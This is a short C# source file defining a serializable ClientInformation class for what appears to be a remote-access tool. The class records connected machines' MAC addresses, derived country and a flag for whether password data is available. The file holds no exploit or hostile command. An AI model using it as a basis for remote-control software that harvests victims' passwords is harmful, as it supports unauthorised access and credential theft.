using System;
using System.ComponentModel;
using System.Globalization;
using System.Net.NetworkInformation;

namespace Orcus.Shared.Connection
{
    [Serializable]
    public abstract class ClientInformation : BaseClientInformation, INotifyPropertyChanged
    {
        public bool IsComputerInformationAvailable { get; set; }
        public bool IsPasswordDataAvailable { get; set; }

        public byte[] MacAddressBytes { get; set; }
        public PhysicalAddress MacAddress => new PhysicalAddress(MacAddressBytes);

        public string Country
        {
            get
            {
                try
                {
                    return new RegionInfo(Language).TwoLetterISORegionName;
                }
                catch (Exception)
                {
                    return new CultureInfo(Language).TwoLetterISOLanguageName;
                }
            }
        }

        [field: NonSerialized]
        public event PropertyChangedEventHandler PropertyChanged;

        public virtual void OnPropertyChanged(string propertyName)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}